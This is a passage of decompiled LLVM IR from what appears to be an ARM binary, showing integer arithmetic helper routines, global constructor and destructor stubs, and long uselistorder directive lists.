  %v1_1747880 = phi i32 [ %v0_173ac, %dec_label_pc_1746c ], [ 0, %bb102 ]
  br i1 %v9_173c8, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_17470 = ashr i32 %v2_173ac, 31
  %v2_17474 = or i32 %v4_17470, 1
  br label %.thread16

dec_label_pc_1747c:                               ; preds = %dec_label_pc_173d0
  %v2_1747c = icmp ugt i32 %v1_17480, 65535
  br i1 %v2_1747c, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_1747c
  %v2_17480 = and i32 %v1_17480, 32768
  %v3_17480 = icmp eq i32 %v2_17480, 0
  %v4_17480 = udiv i32 %v1_17480, 65536
  br i1 %v3_17480, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_1747c
  %v0_1748c70 = phi i32 [ %v1_17480, %dec_label_pc_1747c ], [ %v4_17480, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_17490 = phi i32 [ %v0_1748c70, %.thread19 ], [ %v4_17480, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_1748c = icmp ugt i32 %v1_17490, 255
  br i1 %v2_1748c, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_17490 = and i32 %v1_17490, 128
  %v3_17490 = icmp eq i32 %v2_17490, 0
  %v4_17490 = udiv i32 %v1_17490, 256
  br i1 %v3_17490, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_17494 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_174a0 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_17494, %bb108 ]
  %v1_1749c = phi i32 [ %v1_17490, %bb106 ], [ %v4_17490, %bb107 ], [ %v4_17490, %bb108 ]
  %v2_17498 = icmp ugt i32 %v1_1749c, 15
  br i1 %v2_17498, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_1749c = and i32 %v1_1749c, 8
  %v3_1749c = icmp eq i32 %v2_1749c, 0
  %v4_1749c = udiv i32 %v1_1749c, 16
  br i1 %v3_1749c, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_174a0 = add nsw i32 %v1_174a0, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_174a8 = phi i32 [ %v1_174a0, %.thread20 ], [ %v1_174a0, %bb109 ], [ %v2_174a0, %bb110 ]
  %v5_174ac = phi i32 [ %v1_1749c, %.thread20 ], [ %v4_1749c, %bb109 ], [ %v4_1749c, %bb110 ]
  %v2_174a4 = icmp ugt i32 %v5_174ac, 3
  %v7_174a4 = icmp eq i32 %v5_174ac, 4
  %v2_174a8 = xor i1 %v7_174a4, true
  %v3_174a8 = and i1 %v2_174a4, %v2_174a8
  br i1 %v3_174a8, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_174a8 = add nsw i32 %v4_174a8, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_174ac = phi i32 [ %v4_174a8, %.thread21 ], [ %v5_174a8, %bb111 ]
  %v2_174ac = xor i1 %v2_174a4, true
  %v3_174ac = or i1 %v7_174a4, %v2_174ac
  br i1 %v3_174ac, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_174ac = udiv i32 %v5_174ac, 2
  %v9_174ac = add i32 %v4_174ac, %v8_174ac
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_174b4 = phi i32 [ %v4_174ac, %bb112 ], [ %v9_174ac, %bb113 ]
  %v1_174b0 = icmp slt i32 %v2_173ac, 0
  %v6_174b4 = lshr i32 %v0_174b4, %v1_174b4
  %v2_174b8 = sub i32 0, %v6_174b4
  %v2_174b8.v6_174b4 = select i1 %v1_174b0, i32 %v2_174b8, i32 %v6_174b4
  ret i32 %v2_174b8.v6_174b4

dec_label_pc_174c0:                               ; preds = %entry
  %v0_174c0 = load i32, i32* @lr, align 4
  %v0_174c4 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_174c0)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_174ac, { 1, 0 }
  uselistorder i1 %v7_174a4, { 1, 0 }
  uselistorder i32 %v4_1749c, { 1, 0 }
  uselistorder i32 %v1_1749c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_17490, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_17490, { 1, 0, 2, 3 }
  uselistorder i32 %v4_17480, { 1, 0 }
  uselistorder i32 %v0_17444, { 1, 0 }
  uselistorder i32 %v4_17438, { 1, 0 }
  uselistorder i32 %v1_17440, { 1, 2, 0 }
  uselistorder i32 %v4_1742c, { 1, 0 }
  uselistorder i32 %v1_17434, { 1, 2, 0 }
  uselistorder i32 %v4_17420, { 1, 0 }
  uselistorder i32 %v1_17428, { 1, 2, 0 }
  uselistorder i32 %v1_1744c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1741c, { 1, 0 }
  uselistorder i32 %v1_17448, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_17408, { 1, 0 }
  uselistorder i32 %v3_17404, { 1, 0 }
  uselistorder i32 %v1_17404, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_17400, { 1, 0 }
  uselistorder i32 %v1_17408, { 1, 2, 0, 3 }
  uselistorder i32 %v4_173f4, { 1, 0 }
  uselistorder i32 %v4_173f0, { 2, 1, 0 }
  uselistorder i32 %v1_173f4, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_173fc.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_173c8, { 1, 0 }
  uselistorder i32 %v1_17480, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_173ac, { 1, 0, 2 }
  uselistorder i32 %v0_173ac, { 3, 2, 1, 4, 5, 6, 0 }
  uselistorder i32 ()* @__aeabi_ldiv0, { 3, 2, 1, 0 }
  uselistorder i32* @lr, { 46, 48, 49, 50, 53, 54, 55, 3, 57, 58, 59, 60, 61, 17, 18, 19, 20, 21, 22, 23, 62, 69, 70, 71, 72, 73, 74, 75, 83, 25, 24, 0, 26, 27, 1, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 4, 102, 103, 104, 5, 105, 106, 107, 6, 108, 109, 110, 111, 112, 113, 114, 115, 65, 28, 29, 30, 7, 32, 33, 31, 84, 85, 86, 116, 47, 79, 117, 118, 119, 12, 13, 14, 15, 87, 88, 89, 120, 51, 52, 81, 82, 34, 35, 76, 77, 78, 56, 63, 16, 66, 67, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 2, 64, 10, 11, 68, 80, 90, 91, 8, 9 }
  uselistorder i32 3, { 68, 44, 26, 27, 70, 21, 71, 72, 22, 73, 74, 13, 64, 0, 29, 28, 45, 3, 2, 1, 4, 75, 30, 5, 6, 14, 7, 8, 46, 47, 82, 48, 49, 50, 51, 52, 53, 65, 11, 31, 66, 12, 58, 83, 17, 59, 79, 80, 23, 78, 15, 76, 16, 67, 9, 10, 54, 24, 55, 25, 81, 56, 19, 32, 60, 61, 20, 62, 33, 63, 57, 36, 35, 34, 43, 69, 37, 77, 38, 39, 40, 41, 42, 18 }
  uselistorder i32 15, { 2, 1, 5, 3, 7, 0, 4, 6 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 148, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 145, 63, 146, 64, 147, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 141, 1, 77, 78, 81, 80, 79, 84, 83, 82, 85, 86, 87, 88, 89, 90, 149, 91, 92, 93, 140, 98, 94, 95, 99, 96, 97, 100, 105, 101, 102, 104, 103, 106, 108, 107, 142, 109, 143, 111, 110, 112, 113, 114, 117, 115, 116, 118, 119, 120, 122, 121, 123, 124, 125, 128, 126, 127, 129, 130, 132, 131, 133, 134, 135, 136, 137, 138, 139, 144 }
  uselistorder i32 128, { 11, 6, 7, 9, 5, 18, 0, 20, 21, 1, 19, 8, 14, 15, 2, 3, 10, 16, 17, 4, 13, 12 }
  uselistorder i32 255, { 7, 10, 1, 9, 0, 8, 4, 2, 3, 5, 6 }
  uselistorder i32 65536, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 13, 9, 14, 10, 15, 11, 16, 12, 17, 18, 19, 23, 20, 24, 21, 25, 22, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 75, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 68, 69, 67, 70, 72, 73, 71, 74, 76 }
  uselistorder i32 32768, { 2, 1, 0, 4, 3 }
  uselistorder i32 65535, { 2, 1, 3, 0 }
  uselistorder i32 31, { 15, 10, 4, 12, 2, 1, 0, 5, 7, 6, 8, 3, 13, 14, 11, 9 }
  uselistorder i32 4, {}
  uselistorder i32 2, { 2, 119, 3, 4, 5, 6, 7, 45, 8, 148, 68, 69, 150, 110, 111, 149, 70, 151, 152, 153, 154, 155, 44, 85, 125, 9, 127, 126, 156, 157, 158, 10, 46, 47, 48, 49, 50, 51, 134, 135, 112, 113, 114, 11, 115, 52, 175, 176, 74, 177, 178, 55, 179, 54, 180, 53, 161, 136, 43, 137, 138, 12, 139, 140, 86, 87, 129, 88, 130, 89, 131, 13, 56, 14, 116, 71, 128, 42, 15, 181, 72, 163, 16, 90, 164, 165, 17, 91, 166, 167, 82, 120, 0, 18, 19, 20, 92, 57, 59, 58, 60, 61, 62, 63, 76, 64, 77, 65, 66, 159, 160, 141, 142, 83, 21, 22, 23, 117, 24, 84, 143, 78, 75, 25, 144, 145, 146, 162, 26, 118, 1, 27, 28, 29, 30, 31, 32, 33, 34, 35, 121, 36, 37, 38, 39, 40, 93, 73, 94, 79, 132, 133, 95, 80, 96, 100, 122, 99, 123, 98, 97, 124, 109, 101, 147, 102, 103, 168, 169, 170, 104, 171, 105, 106, 107, 174, 81, 172, 41, 173, 67, 108 }
  uselistorder i32 16, { 3, 22, 4, 5, 1, 6, 7, 86, 87, 88, 0, 89, 90, 8, 9, 91, 92, 10, 93, 94, 95, 96, 63, 64, 106, 107, 30, 31, 32, 113, 33, 114, 115, 34, 116, 117, 35, 118, 119, 120, 121, 122, 123, 97, 101, 102, 65, 66, 36, 67, 68, 69, 70, 71, 72, 73, 74, 98, 37, 75, 27, 57, 38, 54, 84, 55, 108, 109, 124, 25, 103, 104, 76, 77, 78, 79, 80, 81, 50, 99, 100, 56, 105, 24, 11, 12, 13, 14, 15, 16, 23, 17, 18, 2, 19, 20, 28, 40, 41, 58, 59, 60, 42, 61, 62, 43, 39, 44, 82, 83, 51, 52, 45, 53, 85, 26, 29, 46, 110, 111, 47, 112, 21, 48, 49 }
  uselistorder i32 268435455, { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 8, { 52, 25, 3, 4, 15, 5, 108, 109, 110, 111, 0, 1, 112, 113, 114, 115, 116, 6, 117, 59, 45, 46, 53, 118, 119, 120, 121, 21, 122, 75, 140, 151, 37, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 38, 123, 76, 77, 78, 79, 80, 81, 82, 83, 84, 23, 85, 54, 86, 87, 88, 124, 125, 126, 168, 26, 60, 7, 107, 138, 61, 62, 36, 144, 143, 141, 142, 64, 65, 66, 145, 146, 147, 148, 149, 150, 8, 135, 136, 2, 9, 167, 41, 42, 39, 40, 17, 18, 29, 30, 43, 169, 89, 127, 128, 90, 91, 55, 92, 93, 94, 95, 22, 96, 49, 50, 97, 98, 99, 44, 100, 101, 102, 103, 28, 19, 20, 104, 105, 51, 129, 130, 63, 131, 132, 24, 133, 134, 10, 11, 56, 27, 12, 13, 16, 14, 67, 68, 69, 47, 70, 71, 72, 73, 48, 74, 106, 35, 34, 33, 57, 58, 32, 31, 137, 139 }
  uselistorder i32 536870912, { 0, 2, 1 }
  uselistorder i1 true, { 0, 1, 2, 45, 48, 3, 4, 6, 5, 7, 51, 49, 8, 9, 10, 11, 12, 13, 50, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 28, 29, 26, 27, 30, 31, 44, 52, 32, 33, 34, 46, 35, 36, 37, 38, 47, 39, 40, 41, 42, 43 }
  uselistorder i32 %arg2, { 2, 3, 4, 0, 1 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_17454, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_17410, { 2, 0, 1 }
  uselistorder label %dec_label_pc_173fcthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_174d4 = sdiv i32 %arg1, %arg2
  ret i32 %v2_174d4
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_174ec = load i32, i32* @global_var_23088.808, align 4
  %v7_174f0 = icmp eq i32 %v3_174ec, -1
  %v3_174f4 = load i32, i32* @r4, align 4
  store i32 %v3_174f4, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_23088.808 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_174f0, label %bb, label %.preheader

bb:                                               ; preds = %entry
  store i32 %v3_174f4, i32* %r4.global-to-local, align 4
  %v9_174fc = load i32, i32* @r0, align 4
  ret i32 %v9_174fc

.preheader:                                       ; preds = %entry, %.preheader
  %v0_17504 = phi i32 [ %v3_17508, %.preheader ], [ %v3_174ec, %entry ]
  call void @__pseudo_branch(i32 %v0_17504)
  %v0_17508 = load i32, i32* %r4.global-to-local, align 4
  %v1_17508 = add i32 %v0_17508, -4
  %v2_17508 = inttoptr i32 %v1_17508 to i32*
  %v3_17508 = load i32, i32* %v2_17508, align 4
  store i32 %v1_17508, i32* %r4.global-to-local, align 4
  %v3_1750c = icmp eq i32 %v3_17508, -1
  br i1 %v3_1750c, label %dec_label_pc_17514, label %.preheader

dec_label_pc_17514:                               ; preds = %.preheader
  %v2_17514 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17514, i32* %r4.global-to-local, align 4
  %v8_17514 = load i32, i32* @r0, align 4
  ret i32 %v8_17514

; uselistorder directives
  uselistorder i32 %v3_17508, { 1, 0 }
  uselistorder i32 %v3_174ec, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 -4, { 67, 18, 19, 59, 20, 28, 68, 69, 70, 12, 29, 30, 31, 71, 72, 73, 13, 32, 33, 34, 74, 75, 76, 14, 35, 36, 77, 27, 26, 78, 79, 80, 25, 24, 23, 22, 37, 38, 39, 40, 41, 9, 42, 10, 43, 11, 81, 21, 44, 16, 60, 0, 51, 52, 53, 54, 64, 55, 45, 46, 56, 57, 58, 65, 66, 47, 17, 15, 61, 62, 63, 48, 49, 1, 50, 3, 4, 5, 6, 7, 8, 2 }
  uselistorder i32 -1, { 180, 0, 181, 1, 57, 58, 2, 299, 182, 271, 80, 300, 153, 3, 301, 81, 4, 5, 82, 255, 6, 7, 8, 88, 86, 83, 256, 135, 136, 87, 85, 84, 157, 257, 302, 183, 184, 77, 44, 9, 89, 272, 185, 186, 273, 274, 90, 303, 91, 187, 64, 92, 11, 12, 159, 59, 60, 158, 309, 66, 65, 61, 62, 188, 138, 139, 189, 190, 10, 310, 275, 191, 78, 45, 192, 276, 13, 46, 193, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 194, 305, 307, 195, 70, 277, 197, 278, 279, 79, 71, 72, 280, 281, 282, 283, 284, 73, 160, 285, 143, 196, 161, 286, 318, 319, 198, 162, 163, 14, 287, 199, 200, 288, 289, 164, 93, 323, 94, 329, 95, 269, 96, 349, 97, 350, 98, 351, 99, 352, 100, 324, 101, 353, 15, 16, 201, 17, 102, 260, 261, 202, 203, 204, 268, 165, 166, 18, 258, 69, 205, 19, 259, 206, 167, 207, 20, 21, 68, 47, 48, 208, 209, 210, 63, 262, 211, 263, 22, 23, 103, 311, 104, 312, 105, 270, 106, 330, 107, 320, 108, 316, 109, 267, 110, 317, 168, 313, 111, 314, 212, 112, 213, 290, 214, 215, 216, 113, 217, 218, 219, 220, 221, 222, 49, 50, 223, 152, 114, 224, 24, 67, 74, 75, 306, 225, 291, 226, 169, 292, 51, 293, 294, 170, 25, 227, 228, 140, 144, 142, 26, 145, 29, 27, 28, 146, 171, 295, 296, 229, 30, 52, 53, 297, 308, 115, 304, 116, 331, 117, 298, 118, 354, 355, 119, 264, 120, 321, 121, 322, 122, 265, 123, 325, 124, 356, 125, 332, 126, 359, 127, 326, 128, 333, 129, 315, 130, 327, 131, 328, 132, 266, 133, 357, 76, 358, 54, 55, 230, 231, 232, 233, 234, 235, 141, 134, 172, 236, 237, 238, 239, 35, 36, 37, 31, 32, 33, 34, 173, 174, 240, 241, 242, 38, 243, 244, 56, 39, 40, 137, 175, 176, 41, 245, 246, 154, 155, 156, 42, 247, 147, 148, 149, 150, 151, 43, 248, 249, 250, 251, 252, 253, 254, 177, 178, 179 }
  uselistorder i32* @global_var_23088.808, { 1, 0 }
  uselistorder i32 1, {}
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v5_17520 = load i32, i32* @r0, align 4
  ret i32 %v5_17520

; uselistorder directives
  uselistorder i32* @r0, { 8, 9, 10, 163, 11, 170, 171, 172, 173, 176, 174, 175, 12, 56, 57, 177, 178, 7, 179, 180, 135, 136, 137, 181, 182, 189, 203, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 129, 130, 131, 132, 14, 15, 201, 17, 138, 18, 139, 140, 141, 19, 267, 268, 269, 46, 259, 270, 271, 52, 53, 54, 55, 20, 30, 31, 32, 66, 67, 49, 272, 273, 85, 21, 164, 165, 166, 167, 168, 169, 58, 59, 60, 61, 62, 247, 248, 275, 22, 23, 262, 24, 261, 68, 50, 69, 25, 263, 274, 70, 26, 236, 237, 238, 239, 240, 241, 242, 243, 13, 252, 35, 142, 143, 144, 16, 195, 196, 197, 198, 199, 200, 27, 190, 191, 192, 193, 71, 202, 72, 145, 146, 147, 3, 28, 148, 149, 4, 6, 0, 1, 150, 151, 5, 152, 153, 154, 29, 155, 156, 157, 2, 158, 194, 63, 64, 65, 277, 278, 204, 205, 206, 207, 208, 209, 210, 211, 159, 160, 183, 184, 185, 186, 187, 188, 33, 34, 73, 276, 36, 47, 48, 37, 249, 38, 265, 39, 266, 41, 40, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 133, 134, 161, 162, 244, 245, 246, 250, 251, 253, 254, 255, 256, 257, 258, 260, 264, 42, 43, 44, 45, 51 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_17528 = load i32, i32* @r4, align 4
  %v0_17530 = call i32 @__do_global_dtors_aux()
  call void @__pseudo_branch(i32 %v3_17528)
  ret i32 %v0_17530

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 1, 13, 7, 5, 6, 18, 19, 15, 16, 17, 0, 20, 8, 3, 9, 4, 10, 11, 12, 2, 14 }
  uselistorder i32 0, { 0, 1729, 1730, 1731, 1732, 112, 1733, 165, 1734, 1735, 1736, 1737, 1738, 1739, 1740, 166, 1309, 1312, 1310, 1311, 1741, 1742, 1743, 1744, 1745, 1746, 1757, 47, 91, 1758, 1759, 1760, 1761, 1762, 1763, 1772, 1773, 1764, 1765, 1766, 1767, 1768, 1769, 1770, 1771, 1774, 1313, 1522, 1523, 1786, 348, 349, 1777, 1778, 167, 1779, 1780, 1782, 1781, 1783, 1784, 286, 1785, 161, 162, 163, 1787, 1775, 1776, 79, 80, 1788, 1790, 1791, 1789, 1792, 1793, 1794, 1795, 104, 1796, 1797, 105, 1798, 106, 1799, 107, 1800, 170, 1356, 168, 1357, 1358, 1359, 169, 1360, 92, 93, 1361, 171, 1362, 350, 31, 351, 1363, 1364, 287, 172, 352, 353, 1365, 173, 1801, 1802, 1803, 1808, 174, 1804, 240, 354, 1809, 355, 48, 49, 50, 51, 128, 129, 175, 176, 1810, 130, 1811, 294, 293, 292, 1, 100, 52, 1476, 1812, 1813, 1477, 290, 1524, 177, 1814, 1815, 1816, 1817, 1818, 1525, 1526, 32, 1527, 1528, 131, 1529, 1530, 178, 1819, 1820, 1821, 2, 1822, 1823, 1531, 179, 1532, 1533, 1534, 1535, 1536, 1537, 1824, 180, 295, 1825, 1832, 1833, 356, 1834, 1835, 1836, 1837, 1838, 1839, 1840, 1841, 53, 1843, 1842, 94, 1866, 1867, 357, 1901, 1887, 1888, 1889, 4, 3, 299, 284, 285, 291, 1890, 1891, 1893, 1894, 132, 235, 1896, 358, 1897, 1898, 5, 1899, 1900, 1902, 359, 300, 1895, 1892, 1903, 1904, 181, 1905, 1906, 6, 1975, 1976, 1977, 1978, 183, 182, 1979, 184, 1478, 1479, 7, 1314, 1538, 54, 133, 1539, 1540, 241, 8, 1315, 243, 1541, 55, 134, 1542, 1543, 242, 2056, 2057, 2058, 2059, 2062, 2063, 2064, 2065, 2066, 2067, 2068, 2069, 2060, 2061, 2070, 2071, 2072, 2073, 2074, 2075, 2076, 2077, 33, 2078, 2079, 2080, 2081, 34, 2082, 2083, 35, 2084, 2085, 36, 2086, 2087, 2088, 2089, 2090, 2091, 2092, 2093, 2094, 2095, 2096, 2097, 2098, 2099, 2102, 2103, 2104, 2105, 2106, 2107, 2108, 2109, 2100, 2101, 2110, 2111, 2112, 2113, 2114, 2115, 2116, 2117, 37, 2118, 2119, 2120, 2121, 38, 2122, 2123, 2124, 2125, 39, 2126, 2127, 2128, 2129, 2130, 2131, 2132, 2133, 2134, 2135, 2136, 2137, 1844, 1845, 1859, 360, 361, 1860, 1861, 1544, 1545, 1546, 1547, 1548, 1549, 1550, 1551, 1552, 1553, 1554, 1555, 1556, 1557, 1558, 185, 1559, 1560, 1561, 1562, 1563, 1564, 1565, 1566, 1567, 1568, 1569, 1570, 1571, 1572, 1573, 1574, 40, 1575, 1576, 1577, 1578, 1579, 1580, 1581, 135, 103, 1582, 1583, 186, 187, 1584, 1585, 1586, 1587, 188, 1588, 1589, 1590, 1591, 1592, 1593, 1594, 1595, 1596, 41, 1597, 1598, 1599, 1600, 1601, 1602, 1603, 288, 1604, 56, 189, 1605, 190, 362, 1606, 1607, 1608, 1609, 1610, 1611, 42, 1612, 1613, 1614, 1615, 1616, 1617, 1618, 363, 1619, 1620, 1621, 1622, 191, 1623, 1624, 1625, 43, 1626, 125, 1627, 1628, 1629, 1630, 1631, 1632, 1633, 1959, 9, 1960, 1961, 1962, 1316, 1963, 1964, 1965, 1966, 1967, 1968, 1635, 1634, 1636, 1637, 1638, 1639, 1640, 1641, 1642, 1643, 1644, 1645, 1646, 1647, 1648, 1649, 1650, 136, 1846, 1847, 10, 1848, 244, 1651, 245, 1652, 1653, 137, 1654, 1988, 2004, 2005, 2006, 2007, 1502, 2138, 2139, 2140, 2141, 1991, 2142, 1992, 2143, 2144, 192, 2145, 110, 2146, 108, 109, 2147, 2148, 2149, 364, 365, 366, 2153, 367, 2164, 2169, 1317, 246, 2170, 368, 2168, 369, 370, 11, 2150, 2151, 371, 193, 1376, 301, 1377, 374, 303, 302, 1378, 1379, 1380, 1381, 373, 1382, 1383, 372, 1384, 1993, 194, 2152, 1436, 1437, 1438, 1439, 1440, 1441, 196, 138, 1442, 1443, 1444, 111, 195, 1445, 375, 1366, 139, 1367, 140, 1368, 197, 1747, 1748, 1749, 1750, 12, 1925, 1926, 13, 1369, 1370, 1318, 81, 1371, 337, 1372, 377, 2154, 378, 304, 2155, 2156, 2158, 2159, 376, 2010, 2012, 2013, 57, 247, 2014, 2011, 2008, 2009, 14, 1385, 1388, 1386, 1387, 248, 15, 2017, 2015, 2016, 249, 198, 1389, 1390, 1391, 1392, 2018, 2019, 379, 16, 2020, 199, 2021, 2022, 2023, 2024, 2025, 2026, 17, 18, 1393, 1394, 1395, 1396, 380, 19, 381, 1907, 1908, 1306, 1503, 1307, 2027, 1971, 1946, 1429, 1947, 1909, 1910, 200, 1911, 1915, 1916, 1917, 1918, 382, 1919, 1920, 1980, 201, 202, 1969, 383, 305, 1970, 2165, 203, 20, 204, 205, 1655, 1656, 207, 1657, 384, 206, 1658, 95, 21, 1936, 1937, 1659, 1660, 250, 22, 1661, 1912, 1913, 1914, 23, 1805, 1806, 1807, 24, 2171, 2172, 96, 208, 1662, 1663, 1664, 1665, 1666, 209, 1862, 1319, 1863, 126, 141, 1849, 1850, 1857, 1854, 1855, 1856, 251, 1858, 338, 1852, 1851, 252, 1853, 1397, 1398, 1864, 1865, 1399, 1400, 1667, 1668, 1669, 1670, 1671, 142, 1672, 1673, 1674, 1675, 1676, 210, 1677, 1679, 1680, 1678, 1681, 143, 1682, 1683, 211, 1684, 212, 289, 385, 1685, 1686, 213, 214, 1687, 1688, 1689, 1690, 1691, 1692, 306, 1693, 1694, 386, 1695, 307, 1697, 219, 1699, 216, 217, 1696, 215, 1698, 1700, 1702, 145, 1703, 1704, 220, 82, 83, 1705, 1706, 144, 387, 1707, 1708, 221, 388, 1709, 1710, 218, 1711, 1712, 1713, 1714, 1715, 1716, 1717, 1718, 1719, 1720, 389, 1722, 113, 87, 1721, 1723, 1724, 1725, 25, 1352, 222, 1353, 124, 84, 101, 1701, 253, 1373, 26, 255, 223, 1375, 1374, 254, 1320, 308, 2167, 1868, 1869, 1870, 85, 1871, 1872, 224, 1873, 1874, 1875, 1876, 1877, 1878, 1879, 1880, 1881, 1882, 1883, 1884, 1885, 164, 1726, 1886, 1826, 1827, 1828, 1829, 1830, 1831, 1321, 2028, 1751, 2157, 1401, 1972, 1986, 1402, 1994, 2160, 114, 2161, 2054, 2166, 1995, 2055, 1403, 1996, 1404, 1405, 1406, 1407, 1408, 1409, 1410, 1411, 1412, 1413, 1944, 1997, 1998, 1414, 2162, 2163, 27, 1927, 146, 1928, 1929, 237, 236, 1322, 115, 116, 117, 118, 1324, 1323, 59, 58, 147, 1930, 1931, 1932, 1933, 1935, 1934, 28, 2029, 2030, 239, 238, 1325, 119, 120, 121, 122, 1327, 1326, 61, 60, 46, 86, 2031, 1328, 29, 2032, 2033, 123, 2034, 2035, 2036, 2037, 2038, 225, 1329, 1332, 1330, 1331, 2039, 1333, 296, 395, 1415, 396, 256, 397, 1416, 394, 44, 45, 398, 1417, 1418, 399, 407, 408, 513, 514, 62, 309, 390, 391, 392, 310, 393, 1419, 257, 148, 401, 402, 400, 1420, 1421, 1422, 1423, 1425, 275, 1424, 1426, 1427, 405, 406, 403, 404, 1428, 226, 311, 258, 1431, 409, 1430, 411, 412, 410, 413, 414, 1432, 1433, 339, 1434, 415, 1435, 416, 63, 102, 149, 150, 151, 312, 417, 313, 227, 1446, 1447, 423, 228, 1448, 1451, 424, 1449, 425, 229, 1450, 260, 1452, 426, 1453, 420, 1454, 1457, 421, 1455, 422, 1456, 259, 1458, 419, 427, 1459, 1460, 428, 1461, 1464, 429, 1462, 430, 1463, 261, 1465, 418, 431, 1466, 432, 1467, 433, 1468, 434, 1469, 1470, 1471, 435, 1472, 1473, 1474, 1475, 1480, 297, 1481, 438, 1482, 64, 314, 1483, 1484, 1485, 1492, 437, 1486, 1487, 1488, 1489, 1490, 1491, 262, 1493, 439, 1494, 340, 1495, 1496, 436, 1497, 1498, 1499, 1500, 1501, 152, 1504, 441, 1505, 278, 65, 276, 277, 1506, 1507, 1508, 127, 341, 1509, 442, 1510, 440, 1511, 1512, 1513, 443, 1514, 281, 279, 66, 280, 1515, 1516, 444, 1517, 1518, 445, 1519, 1520, 1521, 230, 446, 1727, 1728, 67, 88, 315, 448, 449, 447, 450, 1334, 1335, 473, 1336, 1337, 1338, 1339, 472, 1340, 1341, 1342, 1343, 471, 1344, 1345, 1346, 1347, 468, 469, 451, 1348, 470, 467, 263, 264, 1349, 1350, 459, 1351, 460, 461, 462, 463, 464, 465, 466, 1308, 1752, 68, 98, 1753, 316, 1754, 452, 453, 454, 455, 456, 457, 458, 69, 89, 97, 474, 475, 1755, 476, 1756, 317, 318, 319, 1921, 342, 1922, 1923, 1924, 99, 153, 